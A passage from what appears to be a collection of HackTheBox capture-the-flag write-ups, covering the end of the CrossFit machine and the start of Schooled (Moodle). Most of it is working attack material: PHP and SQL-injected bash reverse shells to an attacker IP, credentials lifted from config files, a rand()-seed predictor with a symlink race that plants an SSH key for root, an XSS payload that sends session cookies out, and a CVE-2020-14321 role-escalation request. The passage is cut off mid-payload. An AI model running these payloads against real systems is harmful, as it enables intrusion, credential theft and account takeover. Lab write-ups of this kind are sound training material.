                $msg = file_get_contents($full_path);
                $command->setStdIn('test');
                $command->execute();
            }
        }
        unlink($full_path);
    }
}

cleanup();
?>
```

We can check that if the mikehaertl library does not protect what it reads in the database ... so we can pass it a command.

Looking in the library repository (you can see the version in the composer.json file) there is a problem in this issue # 44

 - [escapeArgs option is not working properly](https://github.com/mikehaertl/php-shellcommand/issues/44)


now we need ftp credentials to be able to inject the commands into the database so that the php script can read them and run them.

Before doing enumeration I saw the credentials in /var/www/gym-club/db.php

``` bash
hank@crossfit:/home/isaac/send_updates$ cat /var/www/gym-club/db.php 
$dbhost = "localhost";
$dbuser = "crossfit";
$dbpass = "oeLoo~y2baeni";
$db = "crossfit";
$conn = new mysqli($dbhost, $dbuser, $dbpass, $db);
hank@crossfit:/home/isaac/send_updates$
```

Now we only need one thing ftp credentials.

I run linPEAS again and found a interesting file:

``` bash
[+] Readable files belonging to root and readable by me but not world readable
-r--r----- 1 root hank 33 Nov 28 07:54 /home/hank/user.txt                                                                                                                                                                                 
-rw-r----- 1 root admins 384 Sep 27  2017 /etc/pam.d/chfn
-rw-r----- 1 root admins 92 Sep 27  2017 /etc/pam.d/newusers
-rw-r----- 1 root admins 119 Oct  9  2019 /etc/pam.d/vmtoolsd
-rw-r----- 1 root admins 1221 May 11  2020 /etc/pam.d/common-auth
-rw-r----- 1 root admins 4944 May  7  2020 /etc/pam.d/login
-rw-r----- 1 root admins 317 Jan 29  2020 /etc/pam.d/systemd-user
-rw-r----- 1 root admins 138 Jan 10  2019 /etc/pam.d/runuser-l
-rw-r----- 1 root admins 1208 May 11  2020 /etc/pam.d/common-account
-rw-r----- 1 root admins 319 May  1  2020 /etc/pam.d/vsftpd.orig
-rw-r----- 1 root admins 2256 May 11  2020 /etc/pam.d/su
-rw-r----- 1 root admins 647 May 12  2020 /etc/pam.d/vsftpd
-rw-r----- 1 root admins 137 Jan 10  2019 /etc/pam.d/su-l
-rw-r----- 1 root admins 90 May  7  2020 /etc/pam.d/chpasswd
-rw-r----- 1 root admins 1440 May 11  2020 /etc/pam.d/common-password
-rw-r----- 1 root admins 1154 May 11  2020 /etc/pam.d/common-session-noninteractive
-rw-r----- 1 root admins 2133 May  6  2020 /etc/pam.d/sshd
-rw-r----- 1 root admins 1189 May 11  2020 /etc/pam.d/common-session
-rw-r----- 1 root admins 520 Feb 14  2019 /etc/pam.d/other
-rw-r----- 1 root admins 580 May  7  2020 /etc/pam.d/chsh
-rw-r----- 1 root admins 92 Sep 27  2017 /etc/pam.d/passwd
-rw-r----- 1 root admins 606 Oct 11  2019 /etc/pam.d/cron
-rw-r----- 1 root admins 143 Jan 10  2019 /etc/pam.d/runuser
```

Let's see the content inside the file.

``` bash
hank@crossfit:~$ cat /etc/pam.d/vsftpd
auth sufficient pam_mysql.so user=ftpadm passwd=8W)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3
account sufficient pam_mysql.so user=ftpadm passwd=8W)}gpRJvAmnb host=localhost db=ftphosting table=accounts usercolumn=username passwdcolumn=pass crypt=3

# Standard behaviour for ftpd(8).
auth    required        pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeed

# Note: vsftpd handles anonymous logins on its own. Do not enable pam_ftp.so.

# Standard pam includes
@include common-account
@include common-session
@include common-auth
auth    required        pam_shells.so
```

And we find the ftp credentials

``` bash
user=ftpadm passwd=8W)}gpRJvAmnb
```

Without wasting time let's login in ftp with this credentials.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# lftp
lftp :~> set ftp:ssl-force true
lftp :~> connect 10.10.10.208
lftp 10.10.10.208:~> set ssl:verify-certificate no
lftp 10.10.10.208:~> login ftpadm
密码: 
lftp ftpadm@10.10.10.208:~> ls
drwxrwx---    2 1003     116          4096 Sep 21 10:19 messages
lftp ftpadm@10.10.10.208:/> cd messages
lftp ftpadm@10.10.10.208:/messages> ls
lftp ftpadm@10.10.10.208:/messages>
```

There is a one directory called messsage but nothing inside it let's put our rev.php inside it which we previously create.

rev.php

``` bash
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# cat rev.php 
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'") ?>
```

``` bash
lftp ftpadm@10.10.10.208:/messages> ls
lftp ftpadm@10.10.10.208:/messages> put rev.php
69 bytes transferred in 9 seconds (8 B/s)                        
lftp ftpadm@10.10.10.208:/messages> ls
-rw-r--r--    1 1003     1004           69 Nov 28 15:35 rev.php
```

Let's login in mysql database.

``` bash
hank@crossfit:~$ mysql -h localhost -ucrossfit -poeLoo~y2baeni
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2613
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| crossfit           |
| information_schema |
+--------------------+
2 rows in set (0.000 sec)
```

There is one database inside let go inside this and we see users table but nothing inside let's put our rev shell inside.

Before insert inside users table start your netcat listner on 9001.

``` bash
MariaDB [crossfit]> insert into users (id, email) values (9001, "-E $(bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1')");
Query OK, 1 row affected (0.001 sec)                                                                                                   
                                                                                                                                       
MariaDB [crossfit]> select * from users;                                                                                               
+------+----------------------------------------------------------+                                                                    
| id   | email                                                    |
+------+----------------------------------------------------------+
| 9001 | -E $(bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1') |
+------+----------------------------------------------------------+
1 row in set (0.000 sec)

MariaDB [crossfit]>
```

After 10-15sec you get your reverse shell.

``` bash
┌──(root💀kali)-[~]
└─# nc -lvp 9001
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.208.
Ncat: Connection from 10.10.10.208:43934.
bash: cannot set terminal process group (27903): Inappropriate ioctl for device
bash: no job control in this shell
isaac@crossfit:~$ id
id
uid=1000(isaac) gid=1000(isaac) groups=1000(isaac),50(staff),116(ftp),1005(admins)
isaac@crossfit:~$ whoami
whoami
isaac
```

Boom we got the shell for isaac.

Now let's run the pspy to see the which proccess are running inside the box.

 - [pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64)

trasfer this pspy64 inside box and run:

``` bash
hank@crossfit:~$ ./pspy64 -f

2020/11/28 11:31:01 FS:        CLOSE_NOWRITE | /usr/bin/dbmsg
```

There is service called dbmsgthat runs every minute.

But it's a binary file so we can't cat it we need to analize this file with ghidra so let's transfer it to our local machine.

I use nc to transfer the file.

``` bash
hank@crossfit:~$ nc 10.10.14.8 9002 < /usr/bin/dbmsg
```

``` bash
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# nc -lvp 9002 > dbmsg
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9002
Ncat: Listening on 0.0.0.0:9002
Ncat: Connection from 10.10.10.208.
Ncat: Connection from 10.10.10.208:58104.
```

Now let's analize this in ghidra.

 - [ghidra](https://ghidra-sre.org/)

main function

``` bash
void main(void)

{
  __uid_t _Var1;
  time_t tVar2;
  
  _Var1 = geteuid();
  if (_Var1 != 0) {
    fwrite("This program must be run as root.\n",1,0x22,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  process_data();
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

After analize the program i unserstand that

The dbmsg program runs every minute and generates a random number with a "seed" or "base" of the time of the remote machine. with which we can create a C program that runs at the same time as dbmsg. this will create the same random number, always the best is in C since we have to use system libraries like the GNU / Libc glibc random number generator since the binary also uses it.

Let's create the little program or at other words exploit:

exploit.c

``` bash
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main(void)
{
    srand(time(0));
    printf("%d", rand());

    return 0;
}
```

Let's compile the exploit.

``` bash
──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# gcc exploit.c -o exploit
ls -al | grep exploit
-rwxr-xr-x  1 root root   16736 11月 28 11:44 exploit
-rw-r--r--  1 root root     147 11月 28 11:43 exploit.c
```

Now let's create ssh key

``` bash
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# ssh-keygen -t ed25519 -f id_rsa
Generating public/private ed25519 key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:JKM0G1B6lxUQmO715Pq2UBdJoOe9QJjfmeU7tYIwdl4 root@kali
The key's randomart image is:
+--[ED25519 256]--+
|  ...ooo+o.      |
|   oo  * . .     |
|  ..= O + o .    |
|   o.*.O.o *     |
|   .o. +S B E .  |
|    .  ooB + o . |
|      ..  + + .  |
|      ...    o   |
|       oo.       |
+----[SHA256]-----+
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# la -la | grep id_
-rw-------  1 root root     399 11月 28 11:45 id_rsa
-rw-r--r--  1 root root      91 11月 28 11:45 id_rsa.pub
```

Now create one more file called root.sh that will automate our process.

Change the ssh key of yours.

root.sh

``` bash
chmod +x exploit
mysql -h localhost -u crossfit -poeLoo~y2baeni -Dcrossfit -e'insert into messages (id, name, email, message) values (1, "ssh-ed25519", "root@kali", "AAAAC3NzaC1lZDI1NTE5AAAAIBpM8dQcTJXzXOsciQU22F4qpf1jv/SscvQAu+kz7np1");'
while true; do ln -s /root/.ssh/authorized_keys /var/local/$(echo -n $(./exploit)1 | md5sum | cut -d " " -f 1) 2>/dev/null; done
```

Now transfer the file inside /home/isaac/ .

``` bash
isaac@crossfit:~$ wget http://10.10.14.8/exploit
wget http://10.10.14.8/exploit
--2020-11-28 11:57:19--  http://10.10.14.8/exploit
Connecting to 10.10.14.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16736 (16K) [application/octet-stream]
Saving to: ‘exploit’

     0K .......... ......                                     100% 51.9K=0.3s

2020-11-28 11:57:23 (51.9 KB/s) - ‘exploit’ saved [16736/16736]

isaac@crossfit:~$ wget http://10.10.14.8/root.sh
wget http://10.10.14.8/root.sh
--2020-11-28 11:58:11--  http://10.10.14.8/root.sh
Connecting to 10.10.14.8:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 369 [text/x-sh]
Saving to: ‘root.sh’

     0K                                                       100% 60.4M=0s

2020-11-28 11:58:12 (60.4 MB/s) - ‘root.sh’ saved [369/369]

isaac@crossfit:~$ ls -la
ls -la
total 68
drwxr-xr-x 7 isaac isaac   4096 Nov 28 11:58 .
drwxr-xr-x 4 root  root    4096 Sep 21 04:00 ..
lrwxrwxrwx 1 root  root       9 May 12  2020 .bash_history -> /dev/null
-rw-r--r-- 1 isaac isaac    220 Apr 27  2020 .bash_logout
-rw-r--r-- 1 isaac isaac   3526 Apr 27  2020 .bashrc
drwx------ 5 isaac isaac   4096 May  4  2020 .cache
drwxr-xr-x 4 isaac isaac   4096 May 11  2020 .config
-rw-r--r-- 1 isaac isaac  16736 Nov 28 11:44 exploit
drwx------ 3 isaac isaac   4096 Apr 28  2020 .gnupg
drwxr-xr-x 3 isaac isaac   4096 May  4  2020 .local
lrwxrwxrwx 1 isaac isaac      9 May  4  2020 .mysql_history -> /dev/null
-rw-r--r-- 1 isaac isaac    807 Apr 27  2020 .profile
lrwxrwxrwx 1 root  root       9 May 12  2020 .python_history -> /dev/null
-rw-r--r-- 1 isaac isaac    369 Nov 28 11:52 root.sh
-rw-r--r-- 1 isaac isaac     74 May  5  2020 .selected_editor
drwxr-x--- 4 isaac admins  4096 May  9  2020 send_updates
isaac@crossfit:~$ chmod 777 *
chmod 777 *
```

Now run this command:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/crossfit]
└─# chmod 600 id_rsa
ssh -i id_rsa root@10.10.10.208
Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 21 04:46:55 2020
root@crossfit:~# id
uid=0(root) gid=0(root) groups=0(root)
root@crossfit:~# whoami
root
root@crossfit:~# ls
cleanup.sh  delete_ftp_users.sh  root.txt
root@crossfit:~# cat root.txt
961252b5bd669e97c7ab25e93fc1a3a3
```

now we got root, and read the root.txt

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb129.jpg)

#### Summary of knowledge

 - use xss + structured js file to read web pages
 - structured js file to excecute php page
 - use john crack hashs
 - php escapeArgs option is not working properly
 - crontab + mysql to get a reverse shell
 - use pspy to get service runs progresses
 - nc transfer files
 - ghidra anlaliys file
 - ed25519 ssh key + random number generator + bash script to privesc

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end crossfit -->

</details>

<a id="case-schooled"></a>

## 教学平台角色边界与插件执行

教师会话、Moodle 角色和插件权限决定 Web 执行路径。FreeBSD 包管理器的后续权限条件与 Linux 案例分开保留。

<p class="kb-provenance">来源 schooled · 原记录 2021-04-09 · 18 个代码块 · 15 处图片引用</p>

<details class="kb-evidence" id="record-schooled">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start schooled -->

#### introduce

OS:	 FreeBSD
Difficulty: Medium
Points:	30
Release:	03 Apr 2021
IP:	10.10.10.234

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1915.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### information gathering

first use nmap as usaul

``` bash
┌──(root💀kali)-[~/hackthebox/machine/schooled]
└─# nmap -sV -v -p- --min-rate=10000 10.10.10.234
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
33060/tcp open  mysqlx?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=7%D=4/9%Time=60707339%P=x86_64-pc-linux-gnu%r(NU
SF:LL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOpt
SF:ions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVersi
SF:onBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2B
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fIn
SF:valid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
SF:r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\
SF:x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY00
SF:0")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x
SF:05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x
SF:08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20mes
SF:sage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LAND
SF:esk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC
SF:,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0
SF:fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"\
SF:x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid\
SF:x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\
SF:x88'\x1a\x0fInvalid\x20message\"\x05HY000");
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

#### ENUMERATION

After some enumeration i got some users list, then i got subdomain

``` bash
admissions@schooled.htb
schooled.htb
```

ran ffuf to find sub-enumeration its very fast
Compare to gobuster 

``` bash
/root/ffuf/ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://schooled.htb/ -H 'Host: FUZZ.schooled.htb'

moodle         [Status: 200, Size: 84, Words: 5, Lines: 2]  
```

then add moodle.schooled.htb to your /etc/hosts

create new account

make sure set mail id <yourname>@student.schooled.htb

continue

its running on moodle

After some google search i found latest rce for this version 3.9🤩

its vulnerable to CVE-2020-14321

Here is a some reference about this exploit, and how to perform😉

 - [moodle​ RCE | CVE​-2020-14321 PoC](https://www.youtube.com/watch?v=BkEInFI4oIU)
 - [CVE-2020-14321](https://github.com/HoangKien1020/CVE-2020-14321)

Before do this exploit we become manager
So lets switch user to teacher Though xss-account Takeover
ACCOUNT TAKEOVER (Student to Teacher)

 - hint for xss:

``` bash
http://moodle.schooled.htb/moodle/mod/forum/user.php?id=24&mode=discussions
```

 - edit profile:

``` bash
http://moodle.schooled.htb/moodle/user/profile.php?id=28
```

 - put our payload on moodlenet

``` bash
http://moodle.schooled.htb/moodle/user/edit.php
```

Here is the payload i used :

``` bash
<img src=x onerror=this.src='http://10.10.14.7:8000/?'+document.cookie;>
```

Then open your terminal run python -m SimpleHTTPServer (python server) for to catch Manuel Phillip's cookie

Enroll the course and check the server(our python server)

``` bash
python -m SimpleHTTPServer

10.10.10.234 - - [10/Apr/2021 11:52:38] "GET /?MoodleSession=4pot7f8s1sqpobn7bjvidf2s6t HTTP/1.1" 200 -
```

insert the cookie and we become 'manuel phillips'

we are now teacher

our id is 24 don't forget

Go Maths --> Participants 

enroll user Lianne Carter 

why enroll Lianne Carter ? because she is manager

``` bash
http://moodle.schooled.htb/teachers.html
```

capture the request via burp to become manager/administrartor

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1916.jpg)

change id=24 and rollassign=1

Forward the Request  and Now we became Administrator

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1917.jpg)

Then 

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1918.jpg)

Go Define roles

Intercept the Request in Burp And Edits all the roles
Copy the payload from [CVE-2020-14321](https://github.com/HoangKien1020/CVE-2020-14321)

``` bash
&return=manage&resettype=none&shortname=manager&name=&description=&archetype=manager&contextlevel10=0&contextlevel10=1&contextlevel30=0&contextlevel30=1&contextlevel40=0&contextlevel40=1&contextlevel50=0&contextlevel50=1&contextlevel70=0&contextlevel70=1&contextlevel80=0&contextlevel80=1&allowassign%5B%5D=&allowassign%5B%5D=1&allowassign%5B%5D=2&allowassign%5B%5D=3&allowassign%5B%5D=4&allowassign%5B%5D=5&allowassign%5B%5D=6&allowassign%5B%5D=7&allowassign%5B%5D=8&allowoverride%5B%5D=&allowoverride%5B%5D=1&allowoverride%5B%5D=2&allowoverride%5B%5D=3&allowoverride%5B%5D=4&allowoverride%5B%5D=5&allowoverride%5B%5D=6&allowoverride%5B%5D=7&allowoverride%5B%5D=8&allowswitch%5B%5D=&allowswitch%5B%5D=1&allowswitch%5B%5D=2&allowswitch%5B%5D=3&allowswitch%5B%5D=4&allowswitch%5B%5D=5&allowswitch%5B%5D=6&allowswitch%5B%5D=7&allowswitch%5B%5D=8&allowview%5B%5D=&allowview%5B%5D=1&allowview%5B%5D=2&allowview%5B%5D=3&allowview%5B%5D=4&allowview%5B%5D=5&allowview%5B%5D=6&allowview%5B%5D=7&allowview%5B%5D=8&block%2Fadmin_bookmarks%3Amyaddinstance=1&block%2Fbadges%3Amyaddinstance=1&block%2Fcalendar_month%3Amyaddinstance=1&block%2Fcalendar_upcoming%3Amyaddinstance=1&block%2Fcomments%3Amyaddinstance=1&block%2Fcourse_list%3Amyaddinstance=1&block%2Fglobalsearch%3Amyaddinstance=1&block%2Fglossary_random%3Amyaddinstance=1&block%2Fhtml%3Amyaddinstance=1&block%2Flp%3Aaddinstance=1&block%2Flp%3Amyaddinstance=1&block%2Fmentees%3Amyaddinstance=1&block%2Fmnet_hosts%3Amyaddinstance=1&block%2Fmyoverview%3Amyaddinstance=1&block%2Fmyprofile%3Amyaddinstance=1&block%2Fnavigation%3Amyaddinstance=1&block%2Fnews_items%3Amyaddinstance=1&block%2Fonline_users%3Amyaddinstance=1&block%2Fprivate_files%3Amyaddinstance=1&block%2Frecentlyaccessedcourses%3Amyaddinstance=1&block%2Frecentlyaccesseditems%3Amyaddinstance=1&block%2Frss_client%3Amyaddinstance=1&block%2Fsettings%3Amyaddinstance=1&block%2Fstarredcourses%3Amyaddinstance=1&block%2Ftags%3Amyaddinstance=1&block%2Ftimeline%3Amyaddinstance=1&enrol%2Fcategory%3Asynchronised=1&message%2Fairnotifier%3Amanagedevice=1&moodle%2Fanalytics%3Alistowninsights=1&moodle%2Fanalytics%3Amanagemodels=1&moodle%2Fbadges%3Amanageglobalsettings=1&moodle%2Fblog%3Acreate=1&moodle%2Fblog%3Amanageentries=1&moodle%2Fblog%3Amanageexternal=1&moodle%2Fblog%3Asearch=1&moodle%2Fblog%3Aview=1&moodle%2Fblog%3Aviewdrafts=1&moodle%2Fcourse%3Aconfigurecustomfields=1&moodle%2Fcourse%3Arecommendactivity=1&moodle%2Fgrade%3Amanagesharedforms=1&moodle%2Fgrade%3Asharegradingforms=1&moodle%2Fmy%3Aconfigsyspages=1&moodle%2Fmy%3Amanageblocks=1&moodle%2Fportfolio%3Aexport=1&moodle%2Fquestion%3Aconfig=1&moodle%2Frestore%3Acreateuser=1&moodle%2Frole%3Amanage=1&moodle%2Fsearch%3Aquery=1&moodle%2Fsite%3Aconfig=1&moodle%2Fsite%3Aconfigview=1&moodle%2Fsite%3Adeleteanymessage=1&moodle%2Fsite%3Adeleteownmessage=1&moodle%2Fsite%3Adoclinks=1&moodle%2Fsite%3Aforcelanguage=1&moodle%2Fsite%3Amaintenanceaccess=1&moodle%2Fsite%3Amanageallmessaging=1&moodle%2Fsite%3Amessageanyuser=1&moodle%2Fsite%3Amnetlogintoremote=1&moodle%2Fsite%3Areadallmessages=1&moodle%2Fsite%3Asendmessage=1&moodle%2Fsite%3Auploadusers=1&moodle%2Fsite%3Aviewparticipants=1&moodle%2Ftag%3Aedit=1&moodle%2Ftag%3Aeditblocks=1&moodle%2Ftag%3Aflag=1&moodle%2Ftag%3Amanage=1&moodle%2Fuser%3Achangeownpassword=1&moodle%2Fuser%3Acreate=1&moodle%2Fuser%3Adelete=1&moodle%2Fuser%3Aeditownmessageprofile=1&moodle%2Fuser%3Aeditownprofile=1&moodle%2Fuser%3Aignoreuserquota=1&moodle%2Fuser%3Amanageownblocks=1&moodle%2Fuser%3Amanageownfiles=1&moodle%2Fuser%3Amanagesyspages=1&moodle%2Fuser%3Aupdate=1&moodle%2Fwebservice%3Acreatemobiletoken=1&moodle%2Fwebservice%3Acreatetoken=1&moodle%2Fwebservice%3Amanagealltokens=1&quizaccess%2Fseb%3Amanagetemplates=1&report%2Fcourseoverview%3Aview=1&report%2Fperformance%3Aview=1&report%2Fquestioninstances%3Aview=1&report%2Fsecurity%3Aview=1&report%2Fstatus%3Aview=1&tool%2Fcustomlang%3Aedit=1&tool%2Fcustomlang%3Aview=1&tool%2Fdataprivacy%3Amanagedataregistry=1&tool%2Fdataprivacy%3Amanagedatarequests=1&tool%2Fdataprivacy%3Arequestdeleteforotheruser=1&tool%2Flpmigrate%3Aframeworksmigrate=1&tool%2Fmonitor%3Amanagetool=1&tool%2Fpolicy%3Aaccept=1&tool%2Fpolicy%3Amanagedocs=1&tool%2Fpolicy%3Aviewacceptances=1&tool%2Fuploaduser%3Auploaduserpictures=1&tool%2Fusertours%3Amanagetours=1&auth%2Foauth2%3Amanagelinkedlogins=1&moodle%2Fbadges%3Amanageownbadges=1&moodle%2Fbadges%3Aviewotherbadges=1&moodle%2Fcompetency%3Aevidencedelete=1&moodle%2Fcompetency%3Aplancomment=1&moodle%2Fcompetency%3Aplancommentown=1&moodle%2Fcompetency%3Aplanmanage=1&moodle%2Fcompetency%3Aplanmanagedraft=1&moodle%2Fcompetency%3Aplanmanageown=1&moodle%2Fcompetency%3Aplanmanageowndraft=1&moodle%2Fcompetency%3Aplanrequestreview=1&moodle%2Fcompetency%3Aplanrequestreviewown=1&moodle%2Fcompetency%3Aplanreview=1&moodle%2Fcompetency%3Aplanview=1&moodle%2Fcompetency%3Aplanviewdraft=1&moodle%2Fcompetency%3Aplanviewown=1&moodle%2Fcompetency%3Aplanviewowndraft=1&moodle%2Fcompetency%3Ausercompetencycomment=1&moodle%2Fcompetency%3Ausercompetencycommentown=1&moodle%2Fcompetency%3Ausercompetencyrequestreview=1&moodle%2Fcompetency%3Ausercompetencyrequestreviewown=1&moodle%2Fcompetency%3Ausercompetencyreview=1&moodle%2Fcompetency%3Ausercompetencyview=1&moodle%2Fcompetency%3Auserevidencemanage=1&moodle%2Fcompetency%3Auserevidencemanageown=0&moodle%2Fcompetency%3Auserevidenceview=1&moodle%2Fuser%3Aeditmessageprofile=1&moodle%2Fuser%3Aeditprofile=1&moodle%2Fuser%3Amanageblocks=1&moodle%2Fuser%3Areaduserblogs=1&moodle%2Fuser%3Areaduserposts=1&moodle%2Fuser%3Aviewalldetails=1&moodle%2Fuser%3Aviewlastip=1&moodle%2Fuser%3Aviewuseractivitiesreport=1&report%2Fusersessions%3Amanageownsessions=1&tool%2Fdataprivacy%3Adownloadallrequests=1&tool%2Fdataprivacy%3Adownloadownrequest=1&tool%2Fdataprivacy%3Amakedatadeletionrequestsforchildren=1&tool%2Fdataprivacy%3Amakedatarequestsforchildren=1&tool%2Fdataprivacy%3Arequestdelete=1&tool%2Fpolicy%3Aacceptbehalf=1&moodle%2Fcategory%3Amanage=1&moodle%2Fcategory%3Aviewcourselist=1&moodle%2Fcategory%3Aviewhiddencategories=1&moodle%2Fcohort%3Aassign=1&moodle%2Fcohort%3Amanage=1&moodle%2Fcompetency%3Acompetencymanage=1&moodle%2Fcompetency%3Acompetencyview=1&moodle%2Fcompetency%3Atemplatemanage=1&moodle%2Fcompetency%3Atemplateview=1&moodle%2Fcourse%3Acreate=1&moodle%2Fcourse%3Arequest=1&moodle%2Fsite%3Aapprovecourse=1&repository%2Fcontentbank%3Aaccesscoursecategorycontent=1&repository%2Fcontentbank%3Aaccessgeneralcontent=1&block%2Frecent_activity%3Aviewaddupdatemodule=1&block%2Frecent_activity%3Aviewdeletemodule=1&contenttype%2Fh5p%3Aaccess=1&contenttype%2Fh5p%3Aupload=1&contenttype%2Fh5p%3Auseeditor=1&enrol%2Fcategory%3Aconfig=1&enrol%2Fcohort%3Aconfig=1&enrol%2Fcohort%3Aunenrol=1&enrol%2Fdatabase%3Aconfig=1&enrol%2Fdatabase%3Aunenrol=1&enrol%2Fflatfile%3Amanage=1&enrol%2Fflatfile%3Aunenrol=1&enrol%2Fguest%3Aconfig=1&enrol%2Fimsenterprise%3Aconfig=1&enrol%2Fldap%3Amanage=1&enrol%2Flti%3Aconfig=1&enrol%2Flti%3Aunenrol=1&enrol%2Fmanual%3Aconfig=1&enrol%2Fmanual%3Aenrol=1&enrol%2Fmanual%3Amanage=1&enrol%2Fmanual%3Aunenrol=1&enrol%2Fmanual%3Aunenrolself=1&enrol%2Fmeta%3Aconfig=1&enrol%2Fmeta%3Aselectaslinked=1&enrol%2Fmeta%3Aunenrol=1&enrol%2Fmnet%3Aconfig=1&enrol%2Fpaypal%3Aconfig=1&enrol%2Fpaypal%3Amanage=1&enrol%2Fpaypal%3Aunenrol=